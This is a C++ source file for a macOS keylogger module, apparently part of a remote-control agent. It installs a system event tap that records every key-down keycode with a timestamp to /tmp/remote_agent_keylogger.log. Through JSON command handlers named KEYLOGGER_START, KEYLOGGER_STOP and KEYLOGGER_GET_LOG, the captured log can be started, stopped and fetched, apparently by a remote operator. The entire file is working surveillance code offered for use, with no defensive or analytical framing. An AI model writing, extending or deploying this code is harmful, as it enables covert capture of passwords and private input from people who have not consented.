#include "keylogger.h"

#include <fstream>
#include <mutex>
#include <sstream>
#include <string>
#include <thread>

#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <ctime>
#endif

static std::string escapeJson(const std::string& input) {
    std::string out;
    for (char c : input) {
        switch (c) {
        case '\\': out += "\\\\"; break;
        case '"': out += "\\\""; break;
        case '\n': out += "\\n"; break;
        case '\r': out += "\\r"; break;
        case '\t': out += "\\t"; break;
        default: out += c; break;
        }
    }
    return out;
}

#ifdef __APPLE__

static std::thread g_keyloggerThread;
static std::mutex g_keyloggerMutex;
static bool g_keyloggerRunning = false;
static CFMachPortRef g_keyTap = nullptr;
static CFRunLoopRef g_keyRunLoop = nullptr;
static const char* kKeylogPath = "/tmp/remote_agent_keylogger.log";

static void appendKeylogLine(const std::string& line) {
    std::ofstream out(kKeylogPath, std::ios::app);
    if (!out) return;
    out << line << '\n';
}

static CGEventRef keyTapCallback(CGEventTapProxy /*proxy*/, CGEventType type, CGEventRef event, void* /*refcon*/) {
    if (type == kCGEventKeyDown) {
        const auto now = std::time(nullptr);
        const auto keyCode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        appendKeylogLine(std::to_string(static_cast<long long>(now)) + " keycode=" +
                         std::to_string(static_cast<long long>(keyCode)));
    }
    return event;
}

static void keyloggerThreadMain() {
    const auto mask = CGEventMaskBit(kCGEventKeyDown);
    g_keyTap = CGEventTapCreate(kCGHIDEventTap, kCGHeadInsertEventTap, kCGEventTapOptionListenOnly,
                                mask, keyTapCallback, nullptr);
    if (!g_keyTap) {
        appendKeylogLine("ERROR: cannot create event tap (need Input Monitoring permission).");
        std::lock_guard<std::mutex> lock(g_keyloggerMutex);
        g_keyloggerRunning = false;
        return;
    }

    CFRunLoopSourceRef source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, g_keyTap, 0);
    g_keyRunLoop = CFRunLoopGetCurrent();
    CFRunLoopAddSource(g_keyRunLoop, source, kCFRunLoopCommonModes);
    CGEventTapEnable(g_keyTap, true);
    appendKeylogLine("KEYLOGGER_START ok");
    CFRunLoopRun();

    CFRunLoopRemoveSource(g_keyRunLoop, source, kCFRunLoopCommonModes);
    CFRelease(source);
    CFRelease(g_keyTap);
    g_keyTap = nullptr;
    g_keyRunLoop = nullptr;
}

std::string keyloggerStartJson() {
    std::lock_guard<std::mutex> lock(g_keyloggerMutex);
    if (g_keyloggerRunning) {
        return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"already_running\"}";
    }
    std::ofstream reset(kKeylogPath, std::ios::trunc);
    if (!reset) {
        return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"log_file_open_failed\"}";
    }
    g_keyloggerRunning = true;
    g_keyloggerThread = std::thread(keyloggerThreadMain);
    return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"started\"}";
}

std::string keyloggerStopJson() {
    {
        std::lock_guard<std::mutex> lock(g_keyloggerMutex);
        if (!g_keyloggerRunning) {
            return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"message\":\"not_running\",\"output\":\"\"}";
        }
        g_keyloggerRunning = false;
    }
    if (g_keyRunLoop) {
        CFRunLoopStop(g_keyRunLoop);
    }
    if (g_keyloggerThread.joinable()) {
        g_keyloggerThread.join();
    }
    std::ifstream in(kKeylogPath);
    std::stringstream ss;
    ss << in.rdbuf();
    return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"output\":\"" + escapeJson(ss.str()) + "\"}";
}

std::string keyloggerGetLogJson() {
    std::ifstream in(kKeylogPath);
    if (!in) {
        return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
               std::string(g_keyloggerRunning ? "true" : "false") + ",\"output\":\"\"}";
    }
    std::stringstream ss;
    ss << in.rdbuf();
    return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
           std::string(g_keyloggerRunning ? "true" : "false") + ",\"output\":\"" +
           escapeJson(ss.str()) + "\"}";
}

#elif defined(_WIN32)

std::string keyloggerStartJson() {
    return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"unsupported_os\"}";
}

std::string keyloggerStopJson() {
    return "{\"ok\":false,\"command\":\"KEYLOGGER_STOP\",\"message\":\"unsupported_os\"}";
}

std::string keyloggerGetLogJson() {
    return "{\"ok\":false,\"command\":\"KEYLOGGER_GET_LOG\",\"message\":\"unsupported_os\"}";
}

#else

std::string keyloggerStartJson() {
    return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"unsupported_os\"}";
}

std::string keyloggerStopJson() {
    return "{\"ok\":false,\"command\":\"KEYLOGGER_STOP\",\"message\":\"unsupported_os\"}";
}

std::string keyloggerGetLogJson() {
    return "{\"ok\":false,\"command\":\"KEYLOGGER_GET_LOG\",\"message\":\"unsupported_os\"}";
}

#endif
